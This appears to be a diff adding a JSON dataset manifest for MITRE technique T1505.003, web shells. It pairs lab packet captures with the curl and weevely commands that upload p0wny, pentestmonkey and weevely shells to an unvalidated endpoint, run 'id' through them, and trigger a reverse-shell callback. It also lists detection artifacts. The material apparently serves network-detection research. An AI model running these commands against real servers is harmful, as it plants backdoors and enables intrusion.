@@ -1,0 +1,179 @@
+{
+  "mitre": {
+    "technique_id": "T1505.003",
+    "technique_name": "Server Software Component: Web Shell",
+    "url": "https://attack.mitre.org/techniques/T1505/003/",
+    "tactics": ["TA0003"]
+  },
+  "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A web shell is a web script that is placed on an openly accessible web server to allow an adversary to access the web server as a gateway into a network.",
+  "artifacts": [
+    "HTTP POST requests with file upload containing PHP/script content",
+    "multipart/form-data requests uploading executable file extensions (.php, .phtml, .php5)",
+    "HTTP requests to newly created files in upload directories",
+    "command execution patterns in HTTP parameters (cmd=, command=, c=)",
+    "HTTP responses containing OS command output (uid=, whoami, /etc/passwd)",
+    "suspicious user-agent strings or raw curl/python upload requests",
+    "outbound reverse shell connections following web shell access"
+  ],
+  "datasets": {
+    "pcaps": [
+      {
+        "id": "t1505.003-internal-unauth-webshell-upload-p0wny",
+        "file": "pcaps/techniques/t1505.003/t1505.003_internal_unauth_webshell_upload__p0wny.pcap",
+        "name": "Web shell upload - p0wny-shell (curl)",
+        "description": "Unauthenticated upload of p0wny-shell (interactive PHP web shell) via the vulnerable file upload endpoint. No extension or MIME validation performed.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [80]
+        },
+        "filter": [
+          "internal",
+          "unauth",
+          "webshell",
+          "upload",
+          "p0wny",
+          "php",
+          "file-upload",
+          "http",
+          "tcp",
+          "80",
+          "critical"
+        ],
+        "command": "curl -F \"file=@./p0wny-shell.php\" http://10.10.10.40/upload.php"
+      },
+      {
+        "id": "t1505.003-internal-unauth-webshell-upload-pentestmonkey",
+        "file": "pcaps/techniques/t1505.003/t1505.003_internal_unauth_webshell_upload__pentestmonkey.pcap",
+        "name": "Web shell upload - pentestmonkey reverse shell (curl)",
+        "description": "Unauthenticated upload of pentestmonkey PHP reverse shell via the vulnerable file upload endpoint. No extension or MIME validation performed.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [80]
+        },
+        "filter": [
+          "internal",
+          "unauth",
+          "webshell",
+          "upload",
+          "pentestmonkey",
+          "reverse-shell",
+          "php",
+          "file-upload",
+          "http",
+          "tcp",
+          "80",
+          "critical"
+        ],
+        "command": "curl -F \"file=@./pentestmonkey-shell.php\" http://10.10.10.40/upload.php"
+      },
+      {
+        "id": "t1505.003-internal-unauth-webshell-upload-weevely",
+        "file": "pcaps/techniques/t1505.003/t1505.003_internal_unauth_webshell_upload__weevely.pcap",
+        "name": "Web shell upload - weevely backdoor (curl)",
+        "description": "Unauthenticated upload of a weevely-generated PHP backdoor via the vulnerable file upload endpoint. No extension or MIME validation performed.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [80]
+        },
+        "filter": [
+          "internal",
+          "unauth",
+          "webshell",
+          "upload",
+          "weevely",
+          "backdoor",
+          "php",
+          "file-upload",
+          "http",
+          "tcp",
+          "80",
+          "critical"
+        ],
+        "command": "curl -F \"file=@./weevely-shell.php\" http://10.10.10.40/upload.php"
+      },
+      {
+        "id": "t1505.003-internal-unauth-webshell-exec-p0wny",
+        "file": "pcaps/techniques/t1505.003/t1505.003_internal_unauth_webshell_exec__p0wny.pcap",
+        "name": "Web shell execution - p0wny-shell interactive session",
+        "description": "Interactive command execution via p0wny-shell after successful upload. The web shell provides a browser-based terminal with AJAX requests for each command executed.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [80]
+        },
+        "filter": [
+          "internal",
+          "unauth",
+          "webshell",
+          "execution",
+          "p0wny",
+          "interactive",
+          "command",
+          "http",
+          "tcp",
+          "80",
+          "critical"
+        ],
+        "command": "curl -s -X POST http://10.10.10.40/uploads/p0wy-shell.php?feature=shell --data-urlencode \"cmd=id\" -d \"cwd=/var/www/html\" | python3 -c \"import sys,json,base64; r=json.load(sys.stdin); print(base64.b64decode(r['stdout']).decode())\""
+      },
+      {
+        "id": "t1505.003-internal-unauth-webshell-exec-pentestmonkey",
+        "file": "pcaps/techniques/t1505.003/t1505.003_internal_unauth_webshell_exec__pentestmonkey.pcap",
+        "name": "Web shell execution - pentestmonkey reverse shell callback",
+        "description": "Triggering the pentestmonkey PHP reverse shell by accessing the uploaded file. The server initiates an outbound TCP connection back to the attacker's listener.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [80]
+        },
+        "filter": [
+          "internal",
+          "unauth",
+          "webshell",
+          "execution",
+          "pentestmonkey",
+          "reverse-shell",
+          "callback",
+          "http",
+          "tcp",
+          "80",
+          "critical"
+        ],
+        "command": "curl http://10.10.10.40/uploads/php-reverse-shell.php"
+      },
+      {
+        "id": "t1505.003-internal-unauth-webshell-exec-weevely",
+        "file": "pcaps/techniques/t1505.003/t1505.003_internal_unauth_webshell_exec__weevely.pcap",
+        "name": "Web shell execution - weevely C2 session",
+        "description": "Establishing a weevely C2 session by connecting to the uploaded backdoor. Weevely uses obfuscated HTTP requests to execute commands on the target.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [80]
+        },
+        "filter": [
+          "internal",
+          "unauth",
+          "webshell",
+          "execution",
+          "weevely",
+          "c2",
+          "obfuscated",
+          "http",
+          "tcp",
+          "80",
+          "critical"
+        ],
+        "command": "weevely http://10.10.10.40/uploads/weevely-shell.php password id"
+      }
+    ]
+  },
+  "metadata": {
+    "domain": "enterprise",
+    "confidence": "high",
+    "schema_version": "1.0"
+  }
+}
